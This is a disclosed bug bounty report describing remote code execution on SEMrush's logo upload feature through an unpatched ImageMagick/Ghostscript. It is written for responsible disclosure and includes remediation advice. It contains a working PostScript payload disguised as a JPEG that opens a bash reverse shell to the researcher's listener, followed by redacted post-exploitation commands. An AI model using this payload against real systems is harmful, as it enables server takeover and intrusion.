# Remote Code Execution on www.semrush.com/my_reports on Logo upload

## Report Details
- **Report ID**: 403417
- **URL**: https://hackerone.com/reports/403417
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-08-31T12:48:47.276Z
- **Disclosed**: 2019-06-24T16:57:38.655Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor

{F340480}

is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2

The following PoC-payload was used to get a reverse shell when issuing the upload:

Save it as `test.jpg` and upload it as an image for the logo:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

(`█████` is the IP of my listener)

This resulted in:

```
█████████
██████████
ls
███████
██████████
app
████████
██████████
████
████████
██████
███
█████████
████████
██████
█████████
█████████
█████
██████████
█████
██████
█████████
███
█████
██████
████
█████
█████████
███████
████████
███
███


███
whoami
████
███████
██████
```

At this point I wasn't sure if this was a third party or not, so I checked two things:

## `██████` to list files in the ██████ dir. It showed me:

```
█████████
███
████████
████████
███████
█████
████
█████████
████
██████████
```

I navigated to 

```
https://www.semrush.com/my_reports/████
https://www.semrush.com/my_reports/████████
```

And confirmed those two files exists in this directory.

## `/etc/hosts`

This one confirmed it by:

```
cat /etc/hosts
127.0.0.1 localhost
█████ ████.semrush.net ███
████████ ███████
```

I'm certain this is a SEMrush-instance.

{F340481}

You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.

Regards,
Frans

## Impact

#

## Attachments
- Screen_Shot_2018-08-31_at_14.46.54.png
